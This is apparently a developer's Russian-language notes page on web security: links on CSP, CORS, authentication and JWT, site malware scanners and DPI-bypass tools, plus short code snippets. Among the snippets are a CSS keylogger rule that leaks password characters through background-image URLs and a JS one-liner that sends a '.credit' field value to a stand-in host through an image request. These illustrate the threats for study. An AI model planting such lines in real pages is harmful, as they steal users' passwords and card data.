#  security

 * https://www.html5rocks.com/en/tutorials/security/content-security-policy/
 * [случайные числа](https://medium.com/@frontman/случайные-числа-не-случайны-252e08e60828/)
 * [css кейлоггер](http://css-live.ru/articles-css/storonnij-css-nebezopasen.html)
 * https://github.com/maxchehab/CSS-Keylogging/blob/master/css-keylogger-extension/keylogger.css
 * [https](https://www.troyhunt.com/the-6-step-happy-path-to-https/)
 * [сканер уязвимостей](https://snyk.io/)
 * [поле ввода пароля](https://www.troyhunt.com/bypassing-browser-security-warnings-with-pseudo-password-fields/)
 * [технологии аутентификации](https://github.com/teesloane/Auth-Boss)
 * [web checklist 2017](https://simplesecurity.sensedeep.com/web-developer-security-checklist-f2e4f43c9c56)
 * [Топ-25 программных ошибок, составленный CWE/SAN;](http://cwe.mitre.org/top25/#Listing)
 * [Топ-10 угроз безопасности веб-приложениям, составленный OWASP.]()
 * [оценка безопасности ПО](https://tproger.ru/translations/measuring-the-security-of-your-software/)
 * http://tproger.ru/tag/safe-code/
 * [Анализ уязвимостей процесса аутентификации](https://bmsdave.github.io/blog/auth-vulnerabilities/)
 * []()
 * https://owasp.org/www-community/Free_for_Open_Source_Application_Security_Tools
 * artifactory https://jfrog.com/security-and-compliance/
 * https://www.sonarqube.org/features/security/


```css
input[type="password"][value$="A"] { background-image: url("http://localhost:3000/A"); }

body { 
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}
```
 * https://css-tricks.com/snippets/css/font-stacks/
 

## Теория

 * [Учебное пособие по защите информации кафедры радиотехники и систем управления МФТИ](https://github.com/vlsergey/infosec)

## платежи payments

 * [Как работает безопасный прием платежей в интернет-магазине](https://habr.com/ru/post/241413/)
 * [invoices workflow](https://stripe.com/docs/billing/invoices/workflow)

## cors

 * https://fetch.spec.whatwg.org/#concept-http-fetch
 * https://fetch.spec.whatwg.org/#concept-request-mode
 * http://grishaev.me/cors
 * http://restlet.com/company/blog/2015/12/15/understanding-and-using-cors/
 * https://www.html5rocks.com/en/tutorials/cors/
 * маскируемся под форму:
 ```
 POST
 data: "user=111&PWD=1111"
 'Content-Type': 'application/x-www-form-urlencoded'
 ```
 * [расширение хрома](https://github.com/chrisdeely/ForceCORS)
    * https://chrome.google.com/webstore/detail/forcecors/oajaiobpeddomajelicdlnkeegnepbin
 * [втыкаем прокси для вебпака](https://github.com/angular/angular-cli/blob/master/docs/documentation/stories/proxy.md)
 ```
	const PROXY_CONFIG = [
			{
			"/server": {
				"target": "https://server:8081/api",
				"secure": false,
				"changeOrigin": true,
				"index": "",
				"host": "server:8081/",
				"logLevel": "debug",
				"pathRewrite": {
					"^/server": ""
			}
		}
	]

	module.exports = PROXY_CONFIG;
 
 ng serve --proxy-config proxy.conf.js
 ```
 * [заголовки http](https://www.w3.org/TR/cors/#syntax)
 * проверка
	```bash
		curl -v 'http://8.8.8.8:8080/index.html' --data 'user=11111&pass=22222' -H 'Content-Type:application/x-www-form-urlencoded'
		curl -v 'http://8.8.8.8:8080/index.html?user=11111&pass=22222' -H 'Content-Type:application/json'
	```
 * [сценарии атак на cors](https://www.securitylab.ru/analytics/498754.php)
 

##  авторизация и аутентификация

 * простой запрос с авторизацией
	```bash
		curl -X 'POST' \
		'https://some.domain.ru/api/getToken' \
		-H 'accept: */*' \
		-H 'Content-Type: application/json' \
		-d '{ \
		"username": "", \
		"password": "" \
		}' \
		-o token.json

		curl -X 'GET' \
		'https://some.domain.ru/api/getSomeData' \
		-H 'accept: text/plain'
		-H 'Authorization: Bearer $(cat token.json)'
	```
 * простой запрос с авторизацией вариант 2
	```bash
		curl -X 'POST' \
		'https://some.domain.ru/api/getCookie' \
		-H 'accept: */*' \
		-H 'Content-Type: application/json' \
		-d '{ \
		"username": "", \
		"password": "" \
		}' \
		-с cookie.txt

		curl -X 'GET' \
		'https://some.domain.ru/api/getSomeData' \
		-H 'accept: text/plain'
		-b cookie.txt
	```
 * [обзор видов авторизации](https://flowers-for-all.com/post/28443)
 * локальный стенд с ssl(необходимо разрешить https://localhost:4200 в настройках CORS серверов)
  ```bash
    mkdir ./util
    openssl req -x509 -nodes -days 365 -newkey rsa:4096 -keyout ./util/nginx.key -out ./util/ssl.crt
    npm run start:proxy:africa:ssl
    # https://localhost:4200/
  ```
 * JWT
	* [Продвинутая JWT авторизация на React и Node js. Access, refresh, активация по почте](https://www.youtube.com/watch?v=fN25fMQZ2v0)
		* access: 15 минут, хранится в localstorage
	* [jwt](https://habrahabr.ru/company/Voximplant/blog/323160/)
	* https://jwt.io/introduction/
	* https://datatracker.ietf.org/doc/html/rfc7519
	* https://habrahabr.ru/company/Voximplant/blog/323160/
 * https://auth0.com/docs/get-started
 * Разница между access_token и refresh_token
	* схема refresh + access токен ограничивает время, на которое атакующий может получить доступ к сервису по токену
	* 

	```
		— access_token не нужно хранить в базе данных, с помощью JWT можно хранить данные в токене — например userId, таким образом при каждом запросе к серверу мы избавляемся от лишнего запроса к базе данных так как ID юзера можно получить из токена
		— refresh_token хеш который хранится в базе данных.
		1. Сервер получает логин/пароль — создает access_token и refresh_token, сохраняет в базу refresh_token, отдает токены на клиент
		2. Клиент использует access_token для доступа к данным пока приложение не будет закрыто, сохраняет refresh_token в хранилище
		3. Если получает от сервера сообщение что срок access_token истек — отправляет запрос на авторизацию с refresh_token, если refresh_token не истек и совпадает с тем что в базе — сервер создает access_token и refresh_token, обновляет в базе refresh_token и отдает на клиент. Если refresh_token не валиден просит ввести логин/пароль
		4. При инициализации приложения если есть refresh_token — делает тоже что и в 3 

		1. refresh_token- это креденшалы для доступа в API при отсутствии сессии юзера. access_token — короткоживущий токен для доступа к ресурсу.
		2. Разные требования к хранению и передаче(и выдаче). То есть узнать refresh_token вы обычно не можете, так как он не гоняется через front channel.
		3. Работу с общей сессией лучше делегировать на ваш IdP/AS/OP по выбору. 

		Если у вас задача аутентификации и авторизации в API и ваши клиенты это серверные приложения, то у вас есть так называемый Client credentials flow. И вам не нужен рефреш в принципе. Просто смотрите за лайфтаймом токена и обновляете его по необходимости.
		Если есть возможность использования сертификатов, то есть client assertion grant: клиент генерирует JWT токен со своей информацией и подписывает его своим приватным ключиком. Сервер валидирует его, проверяет публичную часть (что у регистрации клиента привязан этот сертификат) и если все ок, выдает уже access_token для доступа в API.

		Если веб(SPA) или есть webview то implicit flow. Получаете access_token и вперед в API. Как протухнет — редирект за обновлением или тихонечко в айфрейме запросик. Можно поковырять кишки вот тут.
		https://github.com/AzureAD/azure-activedirectory-library-for-js/tree/dev/lib
	```
 * [Как надо хешировать пароли и как не надо](https://habr.com/ru/post/210760/)
 * [Обзор способов и протоколов аутентификации в веб-приложениях](https://habr.com/ru/company/dataart/blog/262817/)
 * [Как ты реализуешь аутентификацию, приятель?](https://habr.com/ru/company/mailru/blog/343288/)
 * [Курс MIT «Безопасность компьютерных систем». Лекция 17: «Аутентификация пользователя», часть 1](https://habr.com/ru/company/ua-hosting/blog/429680/)
 * [Классификация механизмов аутентификации пользователей и их обзор](https://habr.com/ru/post/177551/)
### беспарольная авторизация

 * [webauthn/CTAP](https://habr.com/company/1cloud/blog/353966/)
 * [по почте](https://habrahabr.ru/post/279173/)

##  web sec

* [How to Implement Security HTTP Headers to Prevent Vulnerabilities](https://geekflare.com/http-header-implementation/)
* [Как использовать HTTP заголовки для предупреждения уязвимостей](https://habr.com/ru/company/hosting-cafe/blog/315802/)
	* `X-Content-Type-Options: nosniff`
* https://habrahabr.ru/company/ruvds/blog/346442/

```js
var devtools = /./;
devtools.toString = function() {
  this.opened = true;
}

console.log(devtools);

if (devtools.opened === true) {
    alert('Панель разработчика открыта');
} else {
    alert('Панель разработчика закрыта');
}
```

```js
let img=new Image(); img.src="https://LULsite.com/?credit="+$('.credit')[0].value;
```

 * https://dzone.com/articles/advanced-web-security-topics
 * https://firstwiki.ru/index.php/Поиск_вирусов_на_сайте/
 * http://www.webhostingbuzz.com/wiki/iframe-injection-hack-recovery/
 * https://firstwiki.ru/index.php/Аудит_безопасности/
 * [Поиск malware/вирусов на сайте 2014](https://kamaok.org.ua/?p=570)
 * [взлом и безопасность веб-сайтов school-php.com](https://www.youtube.com/watch?v=ll9ZqAk70kk)

## сканеры

 * https://rescan.pro/
 * [google dorks scanner](https://habrahabr.ru/post/283210/)
 * [linux malware detect](firstwiki.ru/index.php/Поиск_различных_malware_скриптов/)
 * [aibolit](http://www.revisium.com/ai/)
 * http://online.drweb.com/?url=1
 * http://antivirus-alarm.ru/
 * http://xseo.in/viruscan
 * http://2ip.ru/site-virus-scaner/
 * [owasp](https://www.owasp.org/index.php/OWASP_Xenotix_XSS_Exploit_Framework#Screenshots)

 ## DPI/DLP

  * https://github.com/ValdikSS/GoodbyeDPI
  * https://github.com/bol-van/zapret
